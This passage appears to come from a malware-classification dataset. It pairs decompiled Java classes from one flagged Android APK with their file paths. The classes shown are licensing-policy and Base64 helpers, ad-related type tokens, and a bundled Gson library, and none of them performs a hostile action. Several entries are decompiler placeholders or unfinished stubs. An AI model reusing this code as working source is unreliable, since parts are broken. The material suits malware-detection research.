l2=Long.valueOf(Long.parseLong(str));     }  catch (    NumberFormatException e2) {       Log.w(f45a,""License retry timestamp (GT) missing, grace period disabled"");       str=""0"";       l2=0L;     }     this.n=l2.longValue();     this.s.a(e,str);   }   private void c(  String str){     Long l2;     try {       l2=Long.valueOf(Long.parseLong(str));     }  catch (    NumberFormatException e2) {       Log.w(f45a,""Licence retry count (GR) missing, grace period disabled"");       str=""0"";       l2=0L;     }     this.o=l2.longValue();     this.s.a(f,str);   }   private Map d(  String str){     HashMap hashMap=new HashMap();     try {       for (      NameValuePair nameValuePair : URLEncodedUtils.parse(new URI(""?"" + str),""UTF-8"")) {         hashMap.put(nameValuePair.getName(),nameValuePair.getValue());       }     }  catch (    URISyntaxException e2) {       Log.w(f45a,""Invalid syntax error while decoding extras data from server."");     }     return hashMap;   }   @Override public void a(  r rVar,  t tVar){     if (rVar != r.RETRY) {       a(0L);     }  else {       a(this.p + 1);     }     if (rVar == r.LICENSED) {       Map d2=d(tVar.g);       this.r=rVar;       a((String)d2.get(""VT""));       b((String)d2.get(""GT""));       c((String)d2.get(""GR""));     }  else     if (rVar == r.NOT_LICENSED) {       a(""0"");       b(""0"");       c(""0"");     }     a(rVar);     this.s.a();   }   @Override public boolean a(){     return true;   }   public long b(){     return this.p;   }   public long c(){     return this.m;   }   public long d(){     return this.n;   }   public long e(){     return this.o;   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.android.vending.licensing\v.code","public class v implements q {   private static final String f47a=""StrictPolicy"";   private r f48b=r.RETRY;   private s c;   @Override public void a(  r rVar,  t tVar){     this.f48b=rVar;   }   @Override public boolean a(){     return this.f48b == r.LICENSED;   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.android.vending.licensing\w.code","public class w extends Exception {   private static final long f49a=1;   public w(){   }   public w(  String str){     super(str);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.android.vending.licensing.a\a.code","public class a {   public static final boolean f20a=true;   public static final boolean f21b=false;   static final boolean c;   private static final byte d=61;   private static final byte e=10;   private static final byte[] f;   private static final byte[] g;   private static final byte[] h;   private static final byte[] i;   private static final byte j=-5;   private static final byte k=-1; static {     c=!a.class.desiredAssertionStatus();     f=new byte[]{65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113,114,115,116,117,118,119,120,121,122,48,49,50,51,52,53,54,55,56,57,43,47};     g=new byte[]{65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,97,98,99,100,101,102,103,104,105,106,107,108,109,110,111,112,113,114,115,116,117,118,119,120,121,122,48,49,50,51,52,53,54,55,56,57,45,95};     h=new byte[]{-9,-9,-9,-9,-9,-9,-9,-9,-9,j,j,-9,-9,j,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,j,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,62,-9,-9,-9,63,52,53,54,55,56,57,58,59,60,d,-9,-9,-9,k,-9,-9,-9,0,1,2,3,4,5,6,7,8,9,e,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,-9,-9,-9,-9,-9,-9,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,-9,-9,-9,-9,-9};     i=new byte[]{-9,-9,-9,-9,-9,-9,-9,-9,-9,j,j,-9,-9,j,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,j,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,-9,62,-9,-9,52,53,54,55,56,57,58,59,60,d,-9,-9,-9,k,-9,-9,-9,0,1,2,3,4,5,6,7,8,9,e,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,-9,-9,-9,-9,63,-9,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,-9,-9,-9,-9,-9};   }   private a(){   }   private static int a(  byte[] bArr,  int i2,  byte[] bArr2,  int i3,  byte[] bArr3){     if (bArr[i2 + 2] == 61) {       bArr2[i3]=(byte)((((bArr3[bArr[i2]] << 24) >>> 6) | ((bArr3[bArr[i2 + 1]] << 24) >>> 12)) >>> 16);       return 1;     }     if (bArr[i2 + 3] == 61) {       int i4=((bArr3[bArr[i2]] << 24) >>> 6) | ((bArr3[bArr[i2 + 1]] << 24) >>> 12) | ((bArr3[bArr[i2 + 2]] << 24) >>> 18);       bArr2[i3]=(byte)(i4 >>> 16);       bArr2[i3 + 1]=(byte)(i4 >>> 8);       return 2;     }     int i5=((bArr3[bArr[i2]] << 24) >>> 6) | ((bArr3[bArr[i2 + 1]] << 24) >>> 12) | ((bArr3[bArr[i2 + 2]] << 24) >>> 18)| ((bArr3[bArr[i2 + 3]] << 24) >>> 24);     bArr2[i3]=(byte)(i5 >> 16);     bArr2[i3 + 1]=(byte)(i5 >> 8);     bArr2[i3 + 2]=(byte)i5;     return 3;   }   public static String a(  byte[] bArr){     return a(bArr,0,bArr.length,f,true);   }   public static String a(  byte[] bArr,  int i2,  int i3,  byte[] bArr2,  boolean z){     byte[] a2=a(bArr,i2,i3,bArr2,Integer.MAX_VALUE);     int length=a2.length;     while (!z && length > 0 && a2[length - 1] == 61) {       length--;     }     return new String(a2,0,length);   }   public static String a(  byte[] bArr,  boolean z){     return a(bArr,0,bArr.length,g,z);   }   public static byte[] a(  String str){     byte[] bytes=str.getBytes();     return a(bytes,0,bytes.length);   }   public static byte[] a(  byte[] bArr,  int i2,  int i3){     return a(bArr,i2,i3,h);   }   public static byte[] a(  byte[] bArr,  int i2,  int i3,  byte[] bArr2){     int i4;     int i5;     byte[] bArr3=new byte[((i3 * 3) / 4) + 2];     byte[] bArr4=new byte[4];     int i6=0;     int i7=0;     int i8=0;     while (true) {       if (i6 >= i3) {         break;       }       byte b2=(byte)(bArr[i6 + i2] & Byte.MAX_VALUE);       byte b3=bArr2[b2];       if (b3 < -5) {         throw new b(""Bad Base64 input character at "" + i6 + "": ""+ ((int)bArr[i6 + i2])+ ""(decimal)"");       }       if (b3 < -1) {         i4=i7;         i5=i8;       }  else       if (b2 == 61) {         int i9=i3 - i6;         byte b4=(byte)(bArr[(i3 - 1) + i2] & Byte.MAX_VALUE);         if (i7 == 0 || i7 == 1) {           throw new b(""invalid padding byte '=' at byte offset "" + i6);         }         if ((i7 == 3 && i9 > 2) || (i7 == 4 && i9 > 1)) {           throw new b(""padding byte '=' falsely signals end of encoded value at offset "" + i6);         }         if (b4 != 61 && b4 != 10) {           throw new b(""encoded value has invalid trailing byte"");         }       }  else {         i4=i7 + 1;         bArr4[i7]=b2;         if (i4 == 4) {           i5=a(bArr4,0,bArr3,i8,bArr2) + i8;           i4=0;         }  else {           i5=i8;         }       }       i6++;       i8=i5;       i7=i4;     }     if (i7 != 0) {       if (i7 == 1) {         throw new b(""single trailing character at offset "" + (i3 - 1));       }       int i10=i7 + 1;       bArr4[i7]=d;       i8+=a(bArr4,0,bArr3,i8,bArr2);     }     byte[] bArr5=new byte[i8];     System.arraycopy(bArr3,0,bArr5,0,i8);     return bArr5;   }   public static byte[] a(  byte[] bArr,  int i2,  int i3,  byte[] bArr2,  int i4){     int i5=((i3 + 2) / 3) * 4;     byte[] bArr3=new byte[i5 + (i5 / i4)];     int i6=i3 - 2;     int i7=0;     int i8=0;     int i9=0;     while (i9 < i6) {       int i10=((bArr[i9 + i2] << 24) >>> 8) | ((bArr[(i9 + 1) + i2] << 24) >>> 16) | ((bArr[(i9 + 2) + i2] << 24) >>> 24);       bArr3[i8]=bArr2[i10 >>> 18];       bArr3[i8 + 1]=bArr2[(i10 >>> 12) & 63];       bArr3[i8 + 2]=bArr2[(i10 >>> 6) & 63];       bArr3[i8 + 3]=bArr2[i10 & 63];       int i11=i7 + 4;       if (i11 == i4) {         bArr3[i8 + 4]=e;         i8++;         i11=0;       }       i9+=3;       i8+=4;       i7=i11;     }     if (i9 < i3) {       a(bArr,i9 + i2,i3 - i9,bArr3,i8,bArr2);       if (i7 + 4 == i4) {         bArr3[i8 + 4]=e;         i8++;       }       i8+=4;     }     if (c || i8 == bArr3.length) {       return bArr3;     }     throw new AssertionError();   }   private static byte[] a(  byte[] r4,  int r5,  int r6,  byte[] r7,  int r8,  byte[] r9){     throw new UnsupportedOperationException(""Method not decompiled: com.android.vending.licensing.a.a.a(byte[], int, int, byte[], int, byte[]):byte[]"");   }   public static byte[] b(  String str){     byte[] bytes=str.getBytes();     return b(bytes,0,bytes.length);   }   public static byte[] b(  byte[] bArr){     return a(bArr,0,bArr.length);   }   public static byte[] b(  byte[] bArr,  int i2,  int i3){     return a(bArr,i2,i3,i);   }   public static byte[] c(  byte[] bArr){     return b(bArr,0,bArr.length);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.android.vending.licensing.a\b.code","public class b extends Exception {   private static final long f22a=1;   public b(){   }   public b(  String str){     super(str);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo\a.code","!org.eclipse.jdt.core.dom.TypeDeclaration@21ade60c"
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo\b.code","class b extends TypeToken<Integer> {   final RLA f86a;   public b(  RLA rla){     this.f86a=rla;   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo\c.code","!org.eclipse.jdt.core.dom.TypeDeclaration@776845f5"
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo\d.code","final class d extends TypeToken<List<BannerAdInfo>> { } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo\DefaultDateTypeAdapter.code","final class DefaultDateTypeAdapter implements JsonDeserializer<Date>, JsonSerializer<Date> {   private final DateFormat enUsFormat;   private final DateFormat iso8601Format;   private final DateFormat localFormat;   DefaultDateTypeAdapter(){     this(DateFormat.getDateTimeInstance(2,2,Locale.US),DateFormat.getDateTimeInstance(2,2));   }   DefaultDateTypeAdapter(  int i){     this(DateFormat.getDateInstance(i,Locale.US),DateFormat.getDateInstance(i));   }   public DefaultDateTypeAdapter(  int i,  int i2){     this(DateFormat.getDateTimeInstance(i,i2,Locale.US),DateFormat.getDateTimeInstance(i,i2));   }   public DefaultDateTypeAdapter(  String str){     this(new SimpleDateFormat(str,Locale.US),new SimpleDateFormat(str));   }   DefaultDateTypeAdapter(  DateFormat dateFormat,  DateFormat dateFormat2){     this.enUsFormat=dateFormat;     this.localFormat=dateFormat2;     this.iso8601Format=new SimpleDateFormat(""yyyy-MM-dd'T'HH:mm:ss'Z'"",Locale.US);     this.iso8601Format.setTimeZone(TimeZone.getTimeZone(""UTC""));   }   private Date deserializeToDate(  JsonElement jsonElement){     Date parse; synchronized (this.localFormat) {       try {         parse=this.localFormat.parse(jsonElement.getAsString());       }  catch (      ParseException e) {         try {           parse=this.enUsFormat.parse(jsonElement.getAsString());         }  catch (        ParseException e2) {           try {             parse=this.iso8601Format.parse(jsonElement.getAsString());           }  catch (          ParseException e3) {             throw new JsonSyntaxException(jsonElement.getAsString(),e3);           }         }       }     }     return parse;   }   @Override public Date deserialize(  JsonElement jsonElement,  Type type,  JsonDeserializationContext jsonDeserializationContext){     if (!(jsonElement instanceof JsonPrimitive)) {       throw new JsonParseException(""The date should be a string value"");     }     Date deserializeToDate=deserializeToDate(jsonElement);     if (type == Date.class) {       return deserializeToDate;     }     if (type == Timestamp.class) {       return new Timestamp(deserializeToDate.getTime());     }     if (type == java.sql.Date.class) {       return new java.sql.Date(deserializeToDate.getTime());     }     throw new IllegalArgumentException(getClass() + "" cannot deserialize to "" + type);   }   @Override public JsonElement serialize(  Date date,  Type type,  JsonSerializationContext jsonSerializationContext){     JsonPrimitive jsonPrimitive; synchronized (this.localFormat) {       jsonPrimitive=new JsonPrimitive(this.enUsFormat.format(date));     }     return jsonPrimitive;   }   public String toString(){     StringBuilder sb=new StringBuilder();     sb.append(DefaultDateTypeAdapter.class.getSimpleName());     sb.append('(').append(this.localFormat.getClass().getSimpleName()).append(')');     return sb.toString();   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo\e.code","public final class e extends TypeToken<RootNode<AppWallAdInfo>> { } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo\ExclusionStrategy.code","public interface ExclusionStrategy {   boolean shouldSkipClass(  Class<?> cls);   boolean shouldSkipField(  FieldAttributes fieldAttributes); } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo\f.code","public final class f extends TypeToken<RootNode<PushAdInfo>> { } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo\FieldAttributes.code","public final class FieldAttributes {   private final Field field;   public FieldAttributes(  Field field){     C$Gson$Preconditions.checkNotNull(field);     this.field=field;   }   Object get(  Object obj){     return this.field.get(obj);   }   public <T extends Annotation>T getAnnotation(  Class<T> cls){     return (T)this.field.getAnnotation(cls);   }   public Collection<Annotation> getAnnotations(){     return Arrays.asList(this.field.getAnnotations());   }   public Class<?> getDeclaredClass(){     return this.field.getType();   }   public Type getDeclaredType(){     return this.field.getGenericType();   }   public Class<?> getDeclaringClass(){     return this.field.getDeclaringClass();   }   public String getName(){     return this.field.getName();   }   public boolean hasModifier(  int i){     return (this.field.getModifiers() & i) != 0;   }   boolean isSynthetic(){     return this.field.isSynthetic();   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo\FieldNamingStrategy.code","public interface FieldNamingStrategy {   String translateName(  Field field); } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo\FutureTypeAdapter.code","public class FutureTypeAdapter<T> extends TypeAdapter<T> {   private TypeAdapter<T> delegate;   FutureTypeAdapter(){   }   @Override public T read2(  JsonReader jsonReader){     if (this.delegate == null) {       throw new IllegalStateException();     }     return this.delegate.read2(jsonReader);   }   public void setDelegate(  TypeAdapter<T> typeAdapter){     if (this.delegate != null) {       throw new AssertionError();     }     this.delegate=typeAdapter;   }   @Override public void write(  JsonWriter jsonWriter,  T t){     if (this.delegate == null) {       throw new IllegalStateException();     }     this.delegate.write(jsonWriter,t);   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo\g.code","final class g extends TypeToken<List<TableplaqueAdInfo>> { } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo\Gson.code","public final class Gson {   static final boolean DEFAULT_JSON_NON_EXECUTABLE=false;   private static final String JSON_NON_EXECUTABLE_PREFIX="")]}'\n"";   private final ThreadLocal<Map<TypeToken<?>,FutureTypeAdapter<?>>> calls;   private final ConstructorConstructor constructorConstructor;   final JsonDeserializationContext deserializationContext;   private final List<TypeAdapterFactory> factories;   private final boolean generateNonExecutableJson;   private final boolean htmlSafe;   private final boolean prettyPrinting;   final JsonSerializationContext serializationContext;   private final boolean serializeNulls;   private final Map<TypeToken<?>,TypeAdapter<?>> typeTokenCache; public class FutureTypeAdapter<T> extends TypeAdapter<T> {     private TypeAdapter<T> delegate;     FutureTypeAdapter(){     }     @Override public T read2(    JsonReader jsonReader){       if (this.delegate == null) {         throw new IllegalStateException();       }       return this.delegate.read2(jsonReader);     }     public void setDelegate(    TypeAdapter<T> typeAdapter){       if (this.delegate != null) {         throw new AssertionError();       }       this.delegate=typeAdapter;     }     @Override public void write(    JsonWriter jsonWriter,    T t){       if (this.delegate == null) {         throw new IllegalStateException();       }       this.delegate.write(jsonWriter,t);     }   }   public Gson(){     this(Excluder.DEFAULT,FieldNamingPolicy.IDENTITY,Collections.emptyMap(),false,false,false,true,false,false,LongSerializationPolicy.DEFAULT,Collections.emptyList());   }   public Gson(  Excluder excluder,  FieldNamingStrategy fieldNamingStrategy,  Map<Type,InstanceCreator<?>> map,  boolean z,  boolean z2,  boolean z3,  boolean z4,  boolean z5,  boolean z6,  LongSerializationPolicy longSerializationPolicy,  List<TypeAdapterFactory> list){     this.calls=new ThreadLocal<>();     this.typeTokenCache=Collections.synchronizedMap(new HashMap());     this.deserializationContext=new JsonDeserializationContext(){       @Override public <T>T deserialize(      JsonElement jsonElement,      Type type){         return (T)Gson.this.fromJson(jsonElement,type);       }     } ;     this.serializationContext=new JsonSerializationContext(){       @Override public JsonElement serialize(      Object obj){         return Gson.this.toJsonTree(obj);       }       @Override public JsonElement serialize(      Object obj,      Type type){         return Gson.this.toJsonTree(obj,type);       }     } ;     this.constructorConstructor=new ConstructorConstructor(map);     this.serializeNulls=z;     this.generateNonExecutableJson=z3;     this.htmlSafe=z4;     this.prettyPrinting=z5;     ArrayList arrayList=new ArrayList();     arrayList.add(TypeAdapters.JSON_ELEMENT_FACTORY);     arrayList.add(ObjectTypeAdapter.FACTORY);     arrayList.add(excluder);     arrayList.addAll(list);     arrayList.add(TypeAdapters.STRING_FACTORY);     arrayList.add(TypeAdapters.INTEGER_FACTORY);     arrayList.add(TypeAdapters.BOOLEAN_FACTORY);     arrayList.add(TypeAdapters.BYTE_FACTORY);     arrayList.add(TypeAdapters.SHORT_FACTORY);     arrayList.add(TypeAdapters.newFactory(Long.TYPE,Long.class,longAdapter(longSerializationPolicy)));     arrayList.add(TypeAdapters.newFactory(Double.TYPE,Double.class,doubleAdapter(z6)));     arrayList.add(TypeAdapters.newFactory(Float.TYPE,Float.class,floatAdapter(z6)));     arrayList.add(TypeAdapters.NUMBER_FACTORY);     arrayList.add(TypeAdapters.CHARACTER_FACTORY);     arrayList.add(TypeAdapters.STRING_BUILDER_FACTORY);     arrayList.add(TypeAdapters.STRING_BUFFER_FACTORY);     arrayList.add(TypeAdapters.newFactory(BigDecimal.class,TypeAdapters.BIG_DECIMAL));     arrayList.add(TypeAdapters.newFactory(BigInteger.class,TypeAdapters.BIG_INTEGER));     arrayList.add(TypeAdapters.URL_FACTORY);     arrayList.add(TypeAdapters.URI_FACTORY);     arrayList.add(TypeAdapters.UUID_FACTORY);     arrayList.add(TypeAdapters.LOCALE_FACTORY);     arrayList.add(TypeAdapters.INET_ADDRESS_FACTORY);     arrayList.add(TypeAdapters.BIT_SET_FACTORY);     arrayList.add(DateTypeAdapter.FACTORY);     arrayList.add(TypeAdapters.CALENDAR_FACTORY);     arrayList.add(TimeTypeAdapter.FACTORY);     arrayList.add(SqlDateTypeAdapter.FACTORY);     arrayList.add(TypeAdapters.TIMESTAMP_FACTORY);     arrayList.add(ArrayTypeAdapter.FACTORY);     arrayList.add(TypeAdapters.ENUM_FACTORY);     arrayList.add(TypeAdapters.CLASS_FACTORY);     arrayList.add(new CollectionTypeAdapterFactory(this.constructorConstructor));     arrayList.add(new MapTypeAdapterFactory(this.constructorConstructor,z2));     arrayList.add(new ReflectiveTypeAdapterFactory(this.constructorConstructor,fieldNamingStrategy,excluder));     this.factories=Collections.unmodifiableList(arrayList);   }   private static void assertFullConsumption(  Object obj,  JsonReader jsonReader){     if (obj != null) {       try {         if (jsonReader.peek() != JsonToken.END_DOCUMENT) {           throw new JsonIOException(""JSON document was not fully consumed."");         }       }  catch (      MalformedJsonException e) {         throw new JsonSyntaxException(e);       } catch (      IOException e2) {         throw new JsonIOException(e2);       }     }   }   public void checkValidFloatingPoint(  double d){     if (Double.isNaN(d) || Double.isInfinite(d)) {       throw new IllegalArgumentException(d + "" is not a valid double value as per JSON specification. To override this behavior, use GsonBuilder.serializeSpecialFloatingPointValues() method."");     }   }   private TypeAdapter<Number> doubleAdapter(  boolean z){     return z ? TypeAdapters.DOUBLE : new TypeAdapter<Number>(){       @Override public Number read2(      JsonReader jsonReader){         if (jsonReader.peek() != JsonToken.NULL) {           return Double.valueOf(jsonReader.nextDouble());         }         jsonReader.nextNull();         return null;       }       @Override public void write(      JsonWriter jsonWriter,      Number number){         if (number == null) {           jsonWriter.nullValue();           return;         }         Gson.this.checkValidFloatingPoint(number.doubleValue());         jsonWriter.value(number);       }     } ;   }   private TypeAdapter<Number> floatAdapter(  boolean z){     return z ? TypeAdapters.FLOAT : new TypeAdapter<Number>(){       @Override public Number read2(      JsonReader jsonReader){         if (jsonReader.peek() != JsonToken.NULL) {           return Float.valueOf((float)jsonReader.nextDouble());         }         jsonReader.nextNull();         return null;       }       @Override public void write(      JsonWriter jsonWriter,      Number number){         if (number == null) {           jsonWriter.nullValue();           return;         }         Gson.this.checkValidFloatingPoint(number.floatValue());         jsonWriter.value(number);       }     } ;   }   private TypeAdapter<Number> longAdapter(  LongSerializationPolicy longSerializationPolicy){     return longSerializationPolicy == LongSerializationPolicy.DEFAULT ? TypeAdapters.LONG : new TypeAdapter<Number>(){       @Override public Number read2(      JsonReader jsonReader){         if (jsonReader.peek() != JsonToken.NULL) {           return Long.valueOf(jsonReader.nextLong());         }         jsonReader.nextNull();         return null;       }       @Override public void write(      JsonWriter jsonWriter,      Number number){         if (number == null) {           jsonWriter.nullValue();         }  else {           jsonWriter.value(number.toString());         }       }     } ;   }   private JsonWriter newJsonWriter(  Writer writer){     if (this.generateNonExecutableJson) {       writer.write(JSON_NON_EXECUTABLE_PREFIX);     }     JsonWriter jsonWriter=new JsonWriter(writer);     if (this.prettyPrinting) {       jsonWriter.setIndent(""  "");     }     jsonWriter.setSerializeNulls(this.serializeNulls);     return jsonWriter;   }   public <T>T fromJson(  JsonElement jsonElement,  Class<T> cls){     return (T)Primitives.wrap(cls).cast(fromJson(jsonElement,(Type)cls));   }   public <T>T fromJson(  JsonElement jsonElement,  Type type){     if (jsonElement == null) {       return null;     }     return (T)fromJson(new JsonTreeReader(jsonElement),type);   }   public <T>T fromJson(  JsonReader jsonReader,  Type type){     boolean z=true;     boolean isLenient=jsonReader.isLenient();     jsonReader.setLenient(true);     try {       try {         jsonReader.peek();         z=false;         T read2=getAdapter(TypeToken.get(type)).read2(jsonReader);         jsonReader.setLenient(isLenient);         return read2;       }  catch (      EOFException e) {         if (!z) {           throw new JsonSyntaxException(e);         }         jsonReader.setLenient(isLenient);         return null;       } catch (      IOException e2) {         throw new JsonSyntaxException(e2);       } catch (      IllegalStateException e3) {         throw new JsonSyntaxException(e3);       }     }  catch (    Throwable th) {       jsonReader.setLenient(isLenient);       throw th;     }   }   public <T>T fromJson(  Reader reader,  Class<T> cls){     JsonReader jsonReader=new JsonReader(reader);     Object fromJson=fromJson(jsonReader,cls);     assertFullConsumption(fromJson,jsonReader);     return (T)Primitives.wrap(cls).cast(fromJson);   }   public <T>T fromJson(  Reader reader,  Type type){     JsonReader jsonReader=new JsonReader(reader);     T t=(T)fromJson(jsonReader,type);     assertFullConsumption(t,jsonReader);     return t;   }   public <T>T fromJson(  String str,  Class<T> cls){     return (T)Primitives.wrap(cls).cast(fromJson(str,(Type)cls));   }   public <T>T fromJson(  String str,  Type type){     if (str == null) {       return null;     }     return (T)fromJson(new StringReader(str),type);   }   public <T>TypeAdapter<T> getAdapter(  TypeToken<T> typeToken){     Map map;     TypeAdapter<T> typeAdapter=(TypeAdapter)this.typeTokenCache.get(typeToken);     if (typeAdapter == null) {       Map<TypeToken<?>,FutureTypeAdapter<?>> map2=this.calls.get();       boolean z=false;       if (map2 == null) {         HashMap hashMap=new HashMap();         this.calls.set(hashMap);         map=hashMap;         z=true;       }  else {         map=map2;       }       typeAdapter=(FutureTypeAdapter)map.get(typeToken);       if (typeAdapter == null) {         try {           FutureTypeAdapter futureTypeAdapter=new FutureTypeAdapter();           map.put(typeToken,futureTypeAdapter);           Iterator<TypeAdapterFactory> it=this.factories.iterator();           while (it.hasNext()) {             typeAdapter=it.next().create(this,typeToken);             if (typeAdapter != null) {               futureTypeAdapter.setDelegate(typeAdapter);               this.typeTokenCache.put(typeToken,typeAdapter);               map.remove(typeToken);               if (z) {                 this.calls.remove();               }             }           }           throw new IllegalArgumentException(""GSON cannot handle "" + typeToken);         }  catch (        Throwable th) {           map.remove(typeToken);           if (z) {             this.calls.remove();           }           throw th;         }       }     }     return typeAdapter;   }   public <T>TypeAdapter<T> getAdapter(  Class<T> cls){     return getAdapter(TypeToken.get((Class)cls));   }   public <T>TypeAdapter<T> getDelegateAdapter(  TypeAdapterFactory typeAdapterFactory,  TypeToken<T> typeToken){     boolean z=false;     for (    TypeAdapterFactory typeAdapterFactory2 : this.factories) {       if (z) {         TypeAdapter<T> create=typeAdapterFactory2.create(this,typeToken);         if (create != null) {           return create;         }       }  else       if (typeAdapterFactory2 == typeAdapterFactory) {         z=true;       }     }     throw new IllegalArgumentException(""GSON cannot serialize "" + typeToken);   }   public String toJson(  JsonElement jsonElement){     StringWriter stringWriter=new StringWriter();     toJson(jsonElement,(Appendable)stringWriter);     return stringWriter.toString();   }   public String toJson(  Object obj){     return obj == null ? toJson((JsonElement)JsonNull.INSTANCE) : toJson(obj,obj.getClass());   }   public String toJson(  Object obj,  Type type){     StringWriter stringWriter=new StringWriter();     toJson(obj,type,stringWriter);     return stringWriter.toString();   }   public void toJson(  JsonElement jsonElement,  JsonWriter jsonWriter){     boolean isLenient=jsonWriter.isLenient();     jsonWriter.setLenient(true);     boolean isHtmlSafe=jsonWriter.isHtmlSafe();     jsonWriter.setHtmlSafe(this.htmlSafe);     boolean serializeNulls=jsonWriter.getSerializeNulls();     jsonWriter.setSerializeNulls(this.serializeNulls);     try {       try {         Streams.write(jsonElement,jsonWriter);       }  catch (      IOException e) {         throw new JsonIOException(e);       }     }   finally {       jsonWriter.setLenient(isLenient);       jsonWriter.setHtmlSafe(isHtmlSafe);       jsonWriter.setSerializeNulls(serializeNulls);     }   }   public void toJson(  JsonElement jsonElement,  Appendable appendable){     try {       toJson(jsonElement,newJsonWriter(Streams.writerForAppendable(appendable)));     }  catch (    IOException e) {       throw new RuntimeException(e);     }   }   public void toJson(  Object obj,  Appendable appendable){     if (obj != null) {       toJson(obj,obj.getClass(),appendable);     }  else {       toJson((JsonElement)JsonNull.INSTANCE,appendable);     }   }   public void toJson(  Object obj,  Type type,  JsonWriter jsonWriter){     TypeAdapter adapter=getAdapter(TypeToken.get(type));     boolean isLenient=jsonWriter.isLenient();     jsonWriter.setLenient(true);     boolean isHtmlSafe=jsonWriter.isHtmlSafe();     jsonWriter.setHtmlSafe(this.htmlSafe);     boolean serializeNulls=jsonWriter.getSerializeNulls();     jsonWriter.setSerializeNulls(this.serializeNulls);     try {       try {         adapter.write(jsonWriter,obj);       }  catch (      IOException e) {         throw new JsonIOException(e);       }     }   finally {       jsonWriter.setLenient(isLenient);       jsonWriter.setHtmlSafe(isHtmlSafe);       jsonWriter.setSerializeNulls(serializeNulls);     }   }   public void toJson(  Object obj,  Type type,  Appendable appendable){     try {       toJson(obj,type,newJsonWriter(Streams.writerForAppendable(appendable)));     }  catch (    IOException e) {       throw new JsonIOException(e);     }   }   public JsonElement toJsonTree(  Object obj){     return obj == null ? JsonNull.INSTANCE : toJsonTree(obj,obj.getClass());   }   public JsonElement toJsonTree(  Object obj,  Type type){     JsonTreeWriter jsonTreeWriter=new JsonTreeWriter();     toJson(obj,type,jsonTreeWriter);     return jsonTreeWriter.get();   }   public String toString(){     return ""{serializeNulls:"" + this.serializeNulls + ""factories:""+ this.factories+ "",instanceCreators:""+ this.constructorConstructor+ ""}"";   } } "
"msc_data/decompiled_malware_class/0053A79C784D2283AC4601DA1DDD00AC947B57C1F4E303A6F42DD0700EC36A9D\com.feiwo\GsonBuilder.code","public final class GsonBuilder {   private boolean complexMapKeySerialization;   private String datePattern;   private boolean generateNonExecutableJson;   private boolean prettyPrinting;   private boolean serializeNulls;   private boolean serializeSpecialFloatingPointValues;   private Excluder excluder=Excluder.DEFAULT;   private LongSerializationPolicy longSerializationPolicy=LongSerializationPolicy.DEFAULT;   private FieldNamingStrategy fieldNamingPolicy=FieldNamingPolicy.IDENTITY;   private final Map<Type,InstanceCreator<?>> instanceCreators=new HashMap();   private final List<TypeAdapterFactory> factories=new ArrayList();   private final List<TypeAdapterFactory> hierarchyFactories=new ArrayList();   private int dateStyle=2;   private int timeStyle=2;   private boolean escapeHtmlChars=true;   private void addTypeAdaptersForDate(  String str,  int i,  int i2,  List<TypeAdapterFactory> list){     DefaultDateTypeAdapter defaultDateTypeAdapter;     if (str != null && !"""".equals(str.trim())) {       defaultDateTypeAdapter=new DefaultDateTypeAdapter(str);     }  else     if (i == 2 || i2 == 2) {       return;     }  else {       defaultDateTypeAdapter=new DefaultDateTypeAdapter(i,i2);     }     list.add(TreeTypeAdapter.newFactory(TypeToken.get(Date.class),defaultDateTypeAdapter));     list.add(TreeTypeAdapter.newFactory(TypeToken.get(Timestamp.class),defaultDateTypeAdapter));     